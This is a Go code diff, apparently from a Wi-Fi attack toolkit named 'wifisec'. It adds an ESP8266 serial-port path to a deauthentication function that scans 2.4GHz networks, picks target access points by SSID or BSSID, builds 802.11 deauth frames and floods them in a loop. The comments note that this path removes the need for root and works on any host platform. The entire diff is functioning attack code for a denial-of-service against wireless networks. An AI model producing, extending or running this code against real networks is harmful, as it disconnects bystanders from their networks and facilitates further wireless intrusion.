@@ -9,7 +9,9 @@ import (
 	"strings"
 	"syscall"
 	"time"
+	"wifisec/internal/constants"
 	"wifisec/internal/ieee80211"
+	platformesp "wifisec/internal/platform/esp8266"
 	platformlinux "wifisec/internal/platform/linux"
 	platformwindows "wifisec/internal/platform/windows"
 	"wifisec/internal/security"
@@ -39,10 +41,17 @@ type deauthTarget struct {
 }
 
 // WifiDeauther 对指定 SSID/BSSID 的 AP 持续广播 802.11 deauthentication 帧。
-// 用法：wifisec deauth <ssid|bssid> [iface]
-// 平台能力差异巨大：Linux/Termux 走内核 AF_PACKET，Windows 走 Npcap 驱动，
+// 用法：wifisec deauth <ssid|bssid> [iface|串口]
+//
+// EMBEDDED_MODE 为 true 时走 ESP8266 串口协处理器路径，与宿主机平台无关，
+// 也无需 root/管理员权限；为 false 时按平台分发：
+// Linux/Termux 走内核 AF_PACKET，Windows 走 Npcap 驱动，
 // macOS 系统层面不开放帧注入，只能给出精确的技术说明。
 func WifiDeauther(arguments []string) error {
+	if constants.EMBEDDED_MODE {
+		return deauthESP(arguments)
+	}
+
 	switch utilities.GetOS() {
 	case utilities.Linux, utilities.Android:
 		return deauthLinux(arguments)
@@ -53,6 +62,94 @@ func WifiDeauther(arguments []string) error {
 	default:
 		return fmt.Errorf("deauth 不支持当前平台：%s", utilities.GetOS())
 	}
+}
+
+// deauthESP 走 ESP8266 串口协处理器路径。
+// 射频在板载芯片上，宿主机只发串口命令，因此任何平台、无 root 皆可运行；
+// 第二位置参数为串口名，缺省时自动枚举唯一 USB 串口。
+// 硬性约束：ESP8266 仅支持 2.4GHz（信道 1-14），5/6GHz 目标会被明确拒绝。
+func deauthESP(arguments []string) error {
+	target, targetMAC, portName, err := parseDeauthArgs(arguments)
+	if err != nil {
+		return err
+	}
+
+	if portName == "" {
+		portName, err = platformesp.DefaultPort()
+		if err != nil {
+			return err
+		}
+	}
+
+	injector, err := platformesp.Open(portName)
+	if err != nil {
+		return err
+	}
+	defer injector.Close()
+
+	utilities.Info("通过 %s 扫描周边 2.4GHz 网络…", portName)
+
+	scanned, err := injector.Scan()
+	if err != nil {
+		return fmt.Errorf("ESP8266 扫描失败：%w", err)
+	}
+
+	targets := selectESPTargets(scanned, target, targetMAC)
+	if len(targets) == 0 {
+		return fmt.Errorf("未找到目标 %s；注意 ESP8266 仅支持 2.4GHz，5/6GHz 网络不可见", target)
+	}
+
+	deauthTargets := make([]deauthTarget, 0, len(targets))
+	for _, ap := range targets {
+		bssid, err := net.ParseMAC(ap.BSSID)
+		if err != nil {
+			utilities.Warn("目标 BSSID 格式异常，已跳过：%s", ap.BSSID)
+			continue
+		}
+
+		frame, err := ieee80211.BuildDeauthFrame(bssid)
+		if err != nil {
+			utilities.Warn("构造 deauth 帧失败（BSSID %s）：%v", ap.BSSID, err)
+			continue
+		}
+
+		deauthTargets = append(deauthTargets, deauthTarget{
+			channel: ap.Channel,
+			bssid:   ap.BSSID,
+			frame:   frame,
+		})
+	}
+
+	if len(deauthTargets) == 0 {
+		return errors.New("所有目标的 BSSID 均无法解析，无法发送 deauth 帧")
+	}
+
+	ctx, stop := setupSignalHandler()
+	defer stop()
+
+	runDeauthLoop(ctx, injector, injector.SetChannel, deauthTargets, portName)
+
+	return nil
+}
+
+// selectESPTargets 按 SSID（精确）或 BSSID（小写比较）筛选 ESP 扫描结果。
+func selectESPTargets(scanned []platformesp.Network, target string, targetMAC net.HardwareAddr) []platformesp.Network {
+	var result []platformesp.Network
+
+	for _, ap := range scanned {
+		if targetMAC != nil {
+			if strings.EqualFold(ap.BSSID, targetMAC.String()) {
+				result = append(result, ap)
+			}
+			continue
+		}
+
+		if ap.SSID == target {
+			result = append(result, ap)
+		}
+	}
+
+	return result
 }
 
 // deauthLinux 是 Linux 与 Android(Termux) 的共享 deauth 路径。
